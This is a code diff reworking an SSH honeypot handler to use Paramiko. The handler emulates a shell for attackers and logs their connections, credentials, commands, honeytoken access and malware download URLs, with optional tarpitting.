-                    data_str, _ = _extract_string(msg_data, 4)
-                    
-                    if data_str:
-                        command = data_str.decode(errors="ignore").strip()
-                        
-                        if command in ["exit", "quit", "logout"]:
-                            break
-                        
-                        if command:
-                            session["commands"].append(command)
-                            output = _execute_command(command)
-                            
-                            # Detect malware
-                            mal_url = _detect_malware_url(command)
-                            if mal_url and log_attack:
-                                arch = _detect_arch(command)
-                                family = _detect_botnet_family(" ".join(session["commands"]))
-                                log_attack(ip, 22, "SSH_MALWARE", json.dumps({
-                                    "url": mal_url,
-                                    "command": command,
-                                    "arch": arch,
-                                    "family": family,
-                                }))
-                            
-                            # Log command
-                            if log_attack:
-                                log_attack(ip, 22, "SSH_COMMAND", json.dumps({
-                                    "command": command,
-                                    "username": session["username"],
-                                }))
-                            
-                            # Honeytoken check
-                            for honeytoken_file in _IOT_FILES:
-                                if honeytoken_file in command:
-                                    if log_attack:
-                                        log_attack(ip, 22, "SSH_HONEYTOKEN", json.dumps({
-                                            "file": honeytoken_file,
-                                            "command": command,
-                                        }))
-                            
-                            if output:
-                                conn.sendall(_ssh_channel_data(recipient_channel, output))
-                            
-                            prompt = random.choice(_PROMPTS)
-                            conn.sendall(_ssh_channel_data(recipient_channel, prompt))
-                            
-                            if is_tarpitted:
-                                time.sleep(TARPIT_DELAY_PER_PACKET)
-                
-                # SSH_MSG_DISCONNECT (1)
-                elif msg_type == 1:
-                    break
-            
+                data = channel.recv(512)
             except socket.timeout:
                 break
-            except Exception:
+            if not data:
                 break
-    
+
+            for ch in data.decode(errors="ignore"):
+                if ch in ("\r", "\n"):
+                    channel.send(b"\r\n")
+                    cmd = buf.strip()
+                    buf = ""
+
+                    if not cmd:
+                        channel.send(prompt.encode())
+                        continue
+
+                    if cmd.lower() in ("exit", "quit", "logout", "bye"):
+                        channel.send(b"logout\r\n")
+                        return
+
+                    session["commands"].append(cmd)
+
+                    if log_attack:
+                        log_attack(ip, 22, "SSH_COMMAND", json.dumps({
+                            "command":  cmd,
+                            "username": session.get("username", ""),
+                            "shell":    True,
+                        }))
+
+                    for hf in _FS:
+                        if hf in cmd and log_attack:
+                            log_attack(ip, 22, "SSH_HONEYTOKEN", json.dumps({
+                                "file": hf, "command": cmd,
+                            }))
+
+                    mal = _detect_malware_url(cmd)
+                    if mal and log_attack:
+                        log_attack(ip, 22, "SSH_MALWARE", json.dumps({
+                            "url":    mal,
+                            "command":cmd,
+                            "arch":   _detect_arch(cmd),
+                            "family": _detect_botnet(" ".join(session["commands"])),
+                        }))
+
+                    if is_tarpitted:
+                        time.sleep(TARPIT_DELAY)
+
+                    output = _execute(cmd)
+                    if output:
+                        channel.send(output.replace("\n", "\r\n").encode(errors="replace"))
+
+                    channel.send(prompt.encode())
+
+                elif ch in ("\x7f", "\x08"):
+                    if buf:
+                        buf = buf[:-1]
+                        channel.send(b"\x08 \x08")
+                elif ch == "\x03":
+                    buf = ""
+                    channel.send(b"^C\r\n")
+                    channel.send(prompt.encode())
+                elif ch == "\x04":
+                    channel.send(b"logout\r\n")
+                    return
+                elif ch == "\x1b":
+                    pass   # absorb ESC sequences
+                else:
+                    buf += ch
+                    channel.send(ch.encode(errors="replace"))
+
+    except Exception:
+        pass
+
+# ═══════════════════════════════════════════════════════════════════════════
+# NON-INTERACTIVE EXEC
+# ═══════════════════════════════════════════════════════════════════════════
+
+def _run_exec(channel, command: str, session: dict, ip: str,
+              log_attack, is_tarpitted: bool):
+    session["commands"].append(command)
+
+    if log_attack:
+        log_attack(ip, 22, "SSH_COMMAND", json.dumps({
+            "command":  command,
+            "username": session.get("username", ""),
+            "exec":     True,
+        }))
+
+    for hf in _FS:
+        if hf in command and log_attack:
+            log_attack(ip, 22, "SSH_HONEYTOKEN", json.dumps({
+                "file": hf, "command": command,
+            }))
+
+    mal = _detect_malware_url(command)
+    if mal and log_attack:
+        log_attack(ip, 22, "SSH_MALWARE", json.dumps({
+            "url":    mal,
+            "command":command,
+            "arch":   _detect_arch(command),
+            "family": _detect_botnet(command),
+        }))
+
+    if is_tarpitted:
+        time.sleep(TARPIT_DELAY)
+
+    output = _execute(command)
+    if output:
+        channel.send(output.encode(errors="replace"))
+
+    channel.send_exit_status(0)
+
+# ═══════════════════════════════════════════════════════════════════════════
+# MAIN ENTRY POINT
+# ═══════════════════════════════════════════════════════════════════════════
+
+def handle_ssh(conn, addr, log_attack=None, geoip_func=None,
+               intel_fields_func=None, new_ip_alert=None):
+    """
+    Drop-in replacement for the previous handle_ssh().
+    Uses Paramiko for real SSH crypto — any client connects successfully.
+    Host key is persisted to disk so fingerprint never changes across restarts.
+    """
+    if not HAS_PARAMIKO:
+        try: conn.close()
+        except Exception: pass
+        return
+
+    ip, port  = addr
+    is_tarpit = _should_tarpit(ip)
+
+    session = {
+        "authenticated": False,
+        "username":      "",
+        "password":      "",
+        "auth_attempts": 0,
+        "commands":      [],
+        "start_time":    time.time(),
+        "is_tarpitted":  is_tarpit,
+    }
+
+    transport = None
+    try:
+        gdata = geoip_func(ip) if geoip_func else {}
+
+        if log_attack:
+            log_attack(ip, 22, "SSH_CONNECT", json.dumps({
+                "event":        "connection",
+                "country":      gdata.get("country", "Unknown"),
+                "city":         gdata.get("city", ""),
+                "is_tarpitted": is_tarpit,
+            }))
+
+        if new_ip_alert and gdata:
+            new_ip_alert(ip, gdata.get("country",""), gdata.get("city",""), "ssh")
+
+        if is_tarpit:
+            time.sleep(TARPIT_DELAY * 2)
+        else:
+            time.sleep(random.uniform(0.05, 0.20))
+
+        # ── Paramiko transport ────────────────────────────────────────────
+        transport = paramiko.Transport(conn)
+        transport.local_version = random.choice(_BANNERS)
+        transport.add_server_key(_get_host_key())
+
+        server = _HoneypotServer(ip, log_attack, session)
+
+        try:
+            transport.start_server(server=server)
+        except (paramiko.SSHException, EOFError, ConnectionResetError):
+            return
+
+        # Log banner exchange
+        client_ver = transport.remote_version or ""
+        if log_attack:
+            log_attack(ip, 22, "SSH_BANNER_EXCHANGE", json.dumps({
+                "client_version": client_ver[:200],
+                "server_version": transport.local_version,
+                "scanner_tool":   _detect_scanner(client_ver),
+            }))
+
+        # ── Channel loop ──────────────────────────────────────────────────
+        deadline = time.time() + 120
+        while time.time() < deadline and transport.is_active():
+            server.shell_ev.clear()
+            server.exec_cmd = None
+
+            channel = transport.accept(25)
+            if channel is None:
+                break
+
+            server.shell_ev.wait(15)
+            exec_cmd = server.exec_cmd
+
+            if exec_cmd:
+                _run_exec(channel, exec_cmd, session, ip, log_attack, is_tarpit)
+                try: channel.close()
+                except Exception: pass
+                # Some bots send multiple exec commands — keep looping
+                continue
+            else:
+                _run_shell(channel, session, ip, log_attack, is_tarpit)
+                try: channel.close()
+                except Exception: pass
+                break
+
     except Exception as e:
         if log_attack:
-            log_attack(ip, 22, "SSH_ERROR", json.dumps({"error": str(e)}))
-    
+            log_attack(ip, 22, "SSH_ERROR", json.dumps({"error": str(e)[:200]}))
     finally:
-        # Save session for replay
-        if session["commands"] and not session["is_replay"]:
-            _save_session_for_replay(session)
-        
-        # Session complete logging
+        if session["commands"]:
+            _save_replay(session)
+
         if log_attack and (session["commands"] or session["auth_attempts"] > 0):
-            session_duration = time.time() - session["start_time"]
             log_attack(ip, 22, "SSH_SESSION_END", json.dumps({
-                "duration": round(session_duration, 2),
+                "duration":      round(time.time() - session["start_time"], 2),
                 "authenticated": session["authenticated"],
-                "username": session.get("username", ""),
-                "password": session.get("password", ""),
+                "username":      session.get("username", ""),
+                "password":      session.get("password", ""),
                 "auth_attempts": session["auth_attempts"],
-                "commands": session["commands"],
+                "commands":      session["commands"],
                 "command_count": len(session["commands"]),
-                "is_tarpitted": is_tarpitted,
-                "is_replay": session["is_replay"],
+                "is_tarpitted":  is_tarpit,
             }))
-        
-        try:
-            conn.close()
-        except Exception:
-            pass
+
+        if transport:
+            try: transport.close()
+            except Exception: pass
+        try: conn.close()
+        except Exception: pass
